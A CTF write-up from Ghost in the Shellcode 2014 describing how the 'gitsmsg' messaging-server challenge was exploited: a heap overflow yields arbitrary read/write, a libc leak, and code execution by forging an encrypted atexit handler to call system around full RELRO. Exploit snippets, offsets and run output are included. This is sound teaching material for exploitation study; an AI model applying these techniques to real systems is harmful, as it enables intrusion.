---
title: 'gitsmsg'
authors:
  - Alex Reece <awreece>
layout: post
categories:
  - Pwn
ctf: Ghost in the Shellcode
year: 2014
---
## tl;dr

`gitsmsg` is a messaging server. A heap overflow led to arbitrary read / write and eventual code exec after circumventing RELRO.

<!--more-->

Binary and exploit available [here][1].

## The program

First, we reverse engineered much of the binary.
You "login" as a user, then can compose messages to other users. The messages
were saved to a linked list and could be edited before being serialized to disk.
Each message is a tagged union of `{byte,dword,double}{_,array}`
or `string`. A `string` indexed into an array of static strings.
A "typical" usage might be:

```
# After connection, appropriate functions hide the binary protocol.
login("alex")
newmessage(to="andrew", msg_type=DWORD_ARRAY, count=1, data=17)
newmassage(to="max", msg_type=STRING, count=1, data=2)
edit(msgid=0, offset=0, data=14)
delete(msgid=1)
save(0)
disconnect()
```

## The vulnerability

In short, when initializing one of the message type, the programmer forgot to
factor the data type width when calculating the message size:

```
case DOUBLE_ARRAY:
  size = count;
  size = 8 * count;
  v3 = 8 * count &lt; 0x3FF;
  v4 = 8 * count == 1023;
  v0-&gt;count = count;
  if ( !(v3 | v4) )
    goto LABEL_9;
  data = (char *)malloc(size);
```

This eventually gives us a heap overwrite:

```
result = readAll(data, size);
```

At this point, it seems relatively straightforward. We will allocate 2 messages,
leaving the heap in this state:

```
| message A | data A | message B |
```

We then free the first message:

```
| &lt;free&gt; | &lt;free&gt; | message B |
```

And allocate a new message of type `DOUBLE_ARRAY`, allowing us to overwrite and
modify the second message:

```
| message C | data C ... essage B |
```

Our goal will be to overwrite a GOT entry and give us a shell. Since the program
is PIE, we have to leak an address first. We do this by editing the second
message which does 2 things for us: it allows us to put it back into a valid
state, and it will put a address from the `.data` segment into the heap (if a
`string` message is edited, it will update the message data pointer to point
to the correct string in the `.data` segment).

Actually, at this point we have an arbitrary read and an arbitrary write
primitive. Since the data for the first message overlaps with the type and
pointer of the second message, we can edit the first message to change the type
of the second. If we change the type of the second message to `dword` and its
pointer to `<address>`, we can get the contents of the second message to read
from that address and edit the contents of the second message to write to that
address.

Once we have the program base, we use our arbitrary read primitive to leak a
`libc` address. We know it is an Ubuntu machine, so we download a couple versions
of `libc` and compare the address to the symbol in each of the versions to match
the correct `libc` version. We can now overwrite `free` with `system` and delete
our message to get a shell!

```
free_addr = arbitrary_read(prog_base + 0x4f2c)
head = prog_base + 0x5160
libc_base = free_addr - 0x781b0
system_addr = libc_base + 0x3d170
```

Except this didn't work &mdash; the program had full RELRO support, so the GOT was
read only.

To get around this, we had to do some painful stuff. We noticed a directory
traversal attack in the login function, and though we could use that to put the
key into the heap (and read it later). Unfortunately, the `malloc`
implementation seemed to clobber the key after it freed the blob. Instead,
our strategy
was to overwrite an `atexit` handler function pointer located in `libc` with the
address of `system` and to overwrite the argument for this handler with a buffer
we controlled. Unfortunately, this function pointer was encrypted. To decrypt,
we computed what the function pointer was supposed to be by leaking an address
from `ld.so` and using the address and the encrypted value to calculate the key.

```
rtld_global_ro_address = arbitrary_read(libc_base + 0x1a0ef8)
ld_base = rtld_global_ro_address - 0x20ca0
ld_fini_address = ld_base + 0xf270
encrypted_atexit_handler = arbitrary_read(libc_base + 0x1a21ec)
xor_key = ror(encrypted_atexit_handler, 9) ^ ld_fini_address
```

We then encrypted our target address with this key, update the function pointer
to use our new address and updated the argument to point to a buffer we
controlled

```
encrypted_system = rol(system_addr ^ xor_key, 9)
arbitrary_write(libc_base + 0x1a21ec, encrypted_system)
arbitrary_write(libc_base + 0x1a21f0, obj0 + 0x110)
```

To trigger our exploit, we just sent the disconnect message (which fortunately
didn't disconnect the socket). For our final exploit, we used the payload
`cat key >&4` to dump the key to the already open socket.

```
$ python gitsmsg.py
Deleting messages ...
Performing overflow ...
Editing ...
Getting ...
Getting libc base ...
Getting ld base ...
Writing encrypted function pointer ...
The key is: lol, tagged unions for the WIN!
*** Connection closed by remote host ***
```

 [1]: http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/gitsmsg.tar.gz